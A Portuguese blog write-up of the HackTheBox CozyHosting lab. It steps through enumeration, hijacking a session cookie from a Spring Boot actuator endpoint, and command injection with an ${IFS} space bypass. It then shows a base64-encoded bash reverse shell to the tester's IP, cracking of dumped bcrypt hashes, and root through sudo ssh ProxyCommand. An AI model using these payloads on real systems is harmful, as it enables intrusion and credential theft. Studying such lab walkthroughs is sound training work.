---
description: CTF do HackTheBox como fiz e anotações.
title: HackTheBox - CozyHosting - Fácil
date: 2024-01-17 06:36:00 +/-0300
categories: [CTF, HackTheBox]
tags: [ctf, hackthebox, linux, sudo, facil, burp, postgres,]    ## TAG names should always be lowercase
show_image_post: true
---
![logo](/assets/img/cozyhosting.png){: w="100" h="100" .left}

---
# **CTF - CozyHosting**
---
---
## **Enumeração**

### nmap

```shell
$ sudo nmap -sS -Pn -n --disable-arp-ping --stats-every=7s  10.10.11.230 --min-rate 10000 -oA nmapver -sVC -p 22,80
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-01-14 18:23 -03
Stats: 0:00:07 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
Service scan Timing: About 100.00% done; ETC: 18:24 (0:00:00 remaining)
Nmap scan report for 10.10.11.230
Host is up (0.14s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 43:56:bc:a7:f2:ec:46:dd:c1:0f:83:30:4c:2c:aa:a8 (ECDSA)
|_  256 6f:7a:6c:3f:a6:8d:e2:75:95:d4:7b:71:ac:4f:7e:42 (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://cozyhosting.htb
|_http-server-header: nginx/1.18.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 11.69 seconds
```
{: .nolineno }

### gobuster

```shell
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
http://cozyhosting.htb/admin                (Status: 401) [Size: 97]
http://cozyhosting.htb/logout               (Status: 204) [Size: 0]
http://cozyhosting.htb/login                (Status: 200) [Size: 4431]
http://cozyhosting.htb/error                (Status: 500) [Size: 73]
http://cozyhosting.htb/index                (Status: 200) [Size: 12706]
http://cozyhosting.htb/plain]               (Status: 400) [Size: 435]
http://cozyhosting.htb/plain].old           (Status: 400) [Size: 435]
http://cozyhosting.htb/[.old                (Status: 400) [Size: 435]
http://cozyhosting.htb/plain].txt           (Status: 400) [Size: 435]
http://cozyhosting.htb/[.txt                (Status: 400) [Size: 435]
http://cozyhosting.htb/[.php                (Status: 400) [Size: 435]
http://cozyhosting.htb/plain].php           (Status: 400) [Size: 435]
http://cozyhosting.htb/[                    (Status: 400) [Size: 435]
http://cozyhosting.htb/].txt                (Status: 400) [Size: 435]
http://cozyhosting.htb/].php                (Status: 400) [Size: 435]
http://cozyhosting.htb/]                    (Status: 400) [Size: 435]
http://cozyhosting.htb/].old                (Status: 400) [Size: 435]
http://cozyhosting.htb/quote].txt           (Status: 400) [Size: 435]
http://cozyhosting.htb/quote]               (Status: 400) [Size: 435]
http://cozyhosting.htb/quote].old           (Status: 400) [Size: 435]
http://cozyhosting.htb/quote].php           (Status: 400) [Size: 435]
http://cozyhosting.htb/extension].txt       (Status: 400) [Size: 435]
http://cozyhosting.htb/extension].old       (Status: 400) [Size: 435]
http://cozyhosting.htb/extension]           (Status: 400) [Size: 435]
http://cozyhosting.htb/extension].php       (Status: 400) [Size: 435]
http://cozyhosting.htb/[0-9].old            (Status: 400) [Size: 435]
http://cozyhosting.htb/[0-9].txt            (Status: 400) [Size: 435]
http://cozyhosting.htb/[0-9]                (Status: 400) [Size: 435]
http://cozyhosting.htb/[0-9].php            (Status: 400) [Size: 435]
http://cozyhosting.htb/20[0-9][0-9]         (Status: 400) [Size: 435]
http://cozyhosting.htb/20[0-9][0-9].txt     (Status: 400) [Size: 435]
http://cozyhosting.htb/20[0-9][0-9].php     (Status: 400) [Size: 435]
http://cozyhosting.htb/20[0-9][0-9].old     (Status: 400) [Size: 435]
http://cozyhosting.htb/[0-1][0-9].old       (Status: 400) [Size: 435]
http://cozyhosting.htb/[0-1][0-9]           (Status: 400) [Size: 435]
http://cozyhosting.htb/[0-1][0-9].txt       (Status: 400) [Size: 435]
http://cozyhosting.htb/[0-1][0-9].php       (Status: 400) [Size: 435]
http://cozyhosting.htb/[2].old              (Status: 400) [Size: 435]
http://cozyhosting.htb/[2].txt              (Status: 400) [Size: 435]
http://cozyhosting.htb/[2]                  (Status: 400) [Size: 435]
http://cozyhosting.htb/[2].php              (Status: 400) [Size: 435]
http://cozyhosting.htb/index                (Status: 200) [Size: 12706]
http://cozyhosting.htb/[2-9].old            (Status: 400) [Size: 435]
http://cozyhosting.htb/[2-9].php            (Status: 400) [Size: 435]
http://cozyhosting.htb/[2-9].txt            (Status: 400) [Size: 435]
http://cozyhosting.htb/[2-9]                (Status: 400) [Size: 435]
http://cozyhosting.htb/options[].txt        (Status: 400) [Size: 435]
http://cozyhosting.htb/options[].php        (Status: 400) [Size: 435]
http://cozyhosting.htb/options[]            (Status: 400) [Size: 435]
http://cozyhosting.htb/options[].old        (Status: 400) [Size: 435]
Progress: 249136 / 249140 (100.00%)
===============================================================
Finished
===============================================================
```
{: .nolineno }

Apenas pagina de login encontrada de uma aplicação chamada bootstrap v5.2.3, buscando por esse nome nenhum exploit encontrado nessa versão.
Busquei por algum writeup e descobri que precisava encontrar alguns diretórios em especifico da aplicação, procurando nas wordlists encontrei essa própria parar essa aplicação.
/usr/share/wordlists/seclists/Discovery/Web-Content/spring-boot.txt


### gobuster actuator diretórios

```shell
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
http://cozyhosting.htb/actuator             (Status: 200) [Size: 634]
http://cozyhosting.htb/actuator/env         (Status: 200) [Size: 4957]
http://cozyhosting.htb/actuator/env/lang    (Status: 200) [Size: 487]
http://cozyhosting.htb/actuator/env/path    (Status: 200) [Size: 487]
http://cozyhosting.htb/actuator/env/home    (Status: 200) [Size: 487]
http://cozyhosting.htb/actuator/health      (Status: 200) [Size: 15]
http://cozyhosting.htb/actuator/mappings    (Status: 200) [Size: 9938]
http://cozyhosting.htb/actuator/sessions    (Status: 200) [Size: 48]
http://cozyhosting.htb/actuator/beans       (Status: 200) [Size: 127224]
Progress: 448 / 452 (99.12%)
===============================================================
Finished
===============================================================
```
{: .nolineno }
Ao acessar http://cozyhosting.htb/actuator/sessions temos o resultado abaixo, é um cookie de sessão do usuário kanderson.

![Alt text](/assets/img/1cozyhosting.png)

Adicionado o cookie no navegador e conseguimos logar na sessão de kanderson.
![Alt text](/assets/img/2cozyhosting.png)

### Burp Suite

Única coisa que podemos mexer são esses campos.
Resultado de captura com burp.
Responde um erro de verificação de chave do ssh.
![Alt text](/assets/img/3cozyhosting100.png)

Com POST da pra ver que o servidor tenta executar o ssh.  
Tento executar algum comando no servidor.  


![Alt text](/assets/img/4cozyhosting.png)

## **Acesso**

De acordo com writeup temos que achar algum character de escape pra conseguir executar comandos no servidor.
Alguns payloads podem ser encontrados aqui https://book.hacktricks.xyz/pentesting-web/command-injection
(Pelo response acima já pode se notar que é vulnerável a injeção de comando, mas por estudo sigo com os próximos passos)
O payload que funcionam são esse:
```text
;`comando`
;comando;#
```
{: .nolineno }
Consegui executar o comando ID.

```text
host=127.0.0.1&username=;`id`

Reposta do Burp

HTTP/1.1 302 
Server: nginx/1.18.0 (Ubuntu)
Date: Mon, 15 Jan 2024 01:53:03 GMT
Content-Length: 0
Location: http://cozyhosting.htb/admin?error=usage: ssh [-46AaCfGgKkMNnqsTtVvXxYy] [-B bind_interface]           [-b bind_address] [-c cipher_spec] [-D [bind_address:]port]           [-E log_file] [-e escape_char] [-F configfile] [-I pkcs11]         [-i identity_file] [-J [user@]host[:port]] [-L address]           [-l login_name] [-m mac_spec] [-O ctl_cmd] [-o option] [-p port]           [-Q query_option] [-R address] [-S ctl_path] [-W host:port]           [-w local_tun[:remote_tun]] destination [command 
[argument ...]]/bin/bash: line 1: uid=1001(app): command not found
Connection: close
X-Content-Type-Options: nosniff
X-XSS-Protection: 0
Cache-Control: no-cache, no-store, max-age=0, must-revalidate
Pragma: no-cache
Expires: 0
X-Frame-Options: DENY
```
{: .nolineno }
Resolvi testar um ping na minha máquina através do payload no burp e capturei com wireshark.
Como não é permitido espaços usamos o ${IFS} no lugar dos espaços que significa (IFS = Internal Field Separator).

```text
host=127.0.0.1&username=;`ping${IFS}10.10.14.188`
```
{: .nolineno }
![Alt text](/assets/img/5cozyhosting.png)

### Payload e Reverse Shell

Agora vamos preparar nosso payload para reverse shell
precisamos encodar em base64

```shell
┌──(kali💀kali)-[~]
└─$ echo 'bash -i >& /dev/tcp/10.10.14.188/4443 0>&1' |base64
YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4xODgvNDQ0MyAwPiYxCg==
```
{: .nolineno }

Lembrando de adicionar o ${IFS} pois nao é permitido espaços, abaixo é nosso payload, vamos adicionar ele no burp, e encodar em URL, para isso selecione todo código e Clique Direito > Convert Selection > URL> Encode All 

```text
;`echo${IFS}'YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4xODgvNDQ0MyAwPiYxCg=='|${IFS}base64${IFS}-d${IFS}|${IFS}bash`
```
{: .nolineno }
Ficando assim no burp
![Alt text](/assets/img/7cozyhosting.png)

## **Exploração**

Reverse shell conectada, vamos baixar o arquivo nesse diretório, abrimos um server http com python e baixamos em nossa maquina com wget

```shell
app@cozyhosting:/app$ ls -la
total 58856
drwxr-xr-x  2 root root     4096 Aug 14 14:11 .
drwxr-xr-x 19 root root     4096 Aug 14 14:11 ..
-rw-r--r--  1 root root 60259688 Aug 11 00:45 cloudhosting-0.0.1.jar
app@cozyhosting:/app$ python3 -m http.server 9090

──(kali💀kali)-[~/HTB/cozyhosting]
└─$ wget http://cozyhosting.htb:9090/cloudhosting-0.0.1.jar     
```
{: .nolineno }
Para descompactar

`unzip cloudhosting-0.0.1.jar`

Temos 3 pastas BOOT-INF, META-INF e org

usando o grep pra pesquisar por passwords nesses diretórios.

```shell
┌──(kali💀kali)-[~/HTB/cozyhosting]
└─$ grep -rnwi 'password' .                                                                  
./BOOT-INF/classes/static/assets/vendor/remixicon/remixicon.symbol.svg:6155:</symbol><symbol viewBox="0 0 24 24" id="ri-lock-password-fill">
./BOOT-INF/classes/static/assets/vendor/remixicon/remixicon.symbol.svg:6160:</symbol><symbol viewBox="0 0 24 24" id="ri-lock-password-line">
./BOOT-INF/classes/static/assets/vendor/remixicon/remixicon.svg:3710:    <glyph glyph-name="lock-password-fill"
./BOOT-INF/classes/static/assets/vendor/remixicon/remixicon.svg:3713:    <glyph glyph-name="lock-password-line"
grep: ./BOOT-INF/classes/static/assets/vendor/remixicon/remixicon.ttf: binary file matches
./BOOT-INF/classes/static/assets/vendor/remixicon/remixicon.less:1277:.ri-lock-password-fill:before { content: "\eecf"; }
./BOOT-INF/classes/static/assets/vendor/remixicon/remixicon.less:1278:.ri-lock-password-line:before { content: "\eed0"; }
grep: ./BOOT-INF/classes/static/assets/vendor/remixicon/remixicon.eot: binary file matches
./BOOT-INF/classes/static/assets/vendor/remixicon/remixicon.css:1276:.ri-lock-password-fill:before { content: "\eecf"; }
./BOOT-INF/classes/static/assets/vendor/remixicon/remixicon.css:1277:.ri-lock-password-line:before { content: "\eed0"; }
grep: ./BOOT-INF/classes/htb/cloudhosting/scheduled/FakeUser.class: binary file matches
grep: ./BOOT-INF/classes/htb/cloudhosting/database/CozyUser.class: binary file matches
grep: ./BOOT-INF/classes/htb/cloudhosting/secutiry/SecurityConfig.class: binary file matches
./BOOT-INF/classes/application.properties:12:spring.datasource.password=Vg&nvzAQ7XxR
./BOOT-INF/classes/templates/login.html:57:                                        <label for="yourPassword" class="form-label">Password</label>
./BOOT-INF/classes/templates/login.html:58:                                        <input type="password" name="password" class="form-control" id="yourPassword"
./BOOT-INF/classes/templates/login.html:60:                                        <div class="invalid-feedback">Please enter your password!</div>
./BOOT-INF/classes/templates/login.html:73:                                    <p th:if="${param.error}" class="text-center small">Invalid username or password</p>
```
{: .nolineno }
Temos essa saída que parece muito com uma senha -> `Vg&nvzAQ7XxR`
Olhando o arquivo mais de perto pra ver do que se trata.

```shell
┌──(kali💀kali)-[~/HTB/cozyhosting]
└─$ cat BOOT-INF/classes/application.properties 
server.address=127.0.0.1
server.servlet.session.timeout=5m
management.endpoints.web.exposure.include=health,beans,env,sessions,mappings
management.endpoint.sessions.enabled = true
spring.datasource.driver-class-name=org.postgresql.Driver
spring.jpa.database-platform=org.hibernate.dialect.PostgreSQLDialect
spring.jpa.hibernate.ddl-auto=none
spring.jpa.database=POSTGRESQL
spring.datasource.platform=postgres
spring.datasource.url=jdbc:postgresql://localhost:5432/cozyhosting
spring.datasource.username=postgres
spring.datasource.password=Vg&nvzAQ7XxR                                             
```
{: .nolineno }

Senha de banco de dados postgres !  
Conectando no POstgres

```shell
app@cozyhosting:/app$ psql -U postgres -h localhost -W
Password: 
psql (14.9 (Ubuntu 14.9-0ubuntu0.22.04.1))
SSL connection (protocol: TLSv1.3, cipher: TLS_AES_256_GCM_SHA384, bits: 256, compression: off)
Type "help" for help.

postgres=# \l


                                  List of databases
    Name     |  Owner   | Encoding |   Collate   |    Ctype    |   Access privileges   
-------------+----------+----------+-------------+-------------+-----------------------
 cozyhosting | postgres | UTF8     | en_US.UTF-8 | en_US.UTF-8 | 
 postgres    | postgres | UTF8     | en_US.UTF-8 | en_US.UTF-8 | 
 template0   | postgres | UTF8     | en_US.UTF-8 | en_US.UTF-8 | =c/postgres          +
             |          |          |             |             | postgres=CTc/postgres
 template1   | postgres | UTF8     | en_US.UTF-8 | en_US.UTF-8 | =c/postgres          +
             |          |          |             |             | postgres=CTc/postgres
(4 rows)

```
{: .nolineno }
Conectando no DB cozyhosting e listando tabelas.
```shell
postgres=# \c cozyhosting
Password: 
SSL connection (protocol: TLSv1.3, cipher: TLS_AES_256_GCM_SHA384, bits: 256, compression: off)
You are now connected to database "cozyhosting" as user "postgres".
cozyhosting=# \dt
         List of relations
 Schema | Name  | Type  |  Owner   
--------+-------+-------+----------
 public | hosts | table | postgres
 public | users | table | postgres
(2 rows)
```
{: .nolineno }

Puxando os dados da tabela users:
```shell
select * from users;

  name    |                           password                           | role  
-----------+--------------------------------------------------------------+-------
 kanderson | $2a$10$E/Vcd9ecflmPudWeLSEIv.cvK6QjxjWlWXpij1NVNV3Mm6eH58zim | User
 admin     | $2a$10$SpKYdHLB0FOaT7n3x72wtuS0yR8uqqbNNpIPjUb2MZib3H9kVO8dm | Admin
(2 rows)

```
{: .nolineno }
A hash do admin se encontra em banco de dados de hashs quebradas na internet.
Mas usamos o john também pra meio de estudo.

`$2a$10$SpKYdHLB0FOaT7n3x72wtuS0yR8uqqbNNpIPjUb2MZib3H9kVO8dm:manchesterunited`

```shell
┌──(kali💀kali)-[~/HTB/cozyhosting]
└─$ john hash --wordlist=/usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (bcrypt [Blowfish 32/64 X3])
Cost 1 (iteration count) is 1024 for all loaded hashes
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
manchesterunited (?)     
1g 0:00:00:57 DONE (2024-01-15 02:38) 0.01750g/s 49.14p/s 49.14c/s 49.14C/s dougie..keyboard
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```
{: .nolineno }

O único usuário que encontramos no servidor foi josh, vamos tentar logar com essa senha nele.

## **Escalação de Privilégio**


### Escalando para usuário josh e Primeira Flag

Logado com sucesso:

```shell
app@cozyhosting:/usr/bin$ su josh
Password: 
josh@cozyhosting:/usr/bin$ cd ~
josh@cozyhosting:~$ ls
user.txt
josh@cozyhosting:~$ cat user.txt 
289d6eb5bdf29c64f8f870f2b83f1905
josh@cozyhosting:~$ 
```
{: .nolineno }
### Escalando para root

```shell
josh@cozyhosting:~$ sudo -l
[sudo] password for josh: 
Sorry, try again.
[sudo] password for josh: 
Matching Defaults entries for josh on localhost:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
    use_pty
User josh may run the following commands on localhost:
    (root) /usr/bin/ssh *
```
{: .nolineno }
O usuário josh pode usar sudo com ssh.  
Checando o [GTFOBins](https://gtfobins.github.io/gtfobins/ssh/#sudo) o comando para obter root é:

sudo ssh -o ProxyCommand=';sh 0<&2 1>&2' x
    
```shell
josh@cozyhosting:~$ sudo ssh -o ProxyCommand=';sh 0<&2 1>&2' x
# whoami
root
# 
```
{: .nolineno }

### Ultima Flag

![Alt text](/assets/img/8cozyhosting.png){: .w-75 .normal}

## Conhecimentos adquiridos:  
- Comandos POstgres  
- Vulnerabilidade da Aplicação 
- Bypass para enviar comandos e encode no burp
- Comandos Postgres (psql)
- wordlist especifica para a aplicação.
- usar quando não é permitido espaços ${IFS} (IFS = Internal Field Separator).
![Alt text](/assets/img/9cozyhosting.png)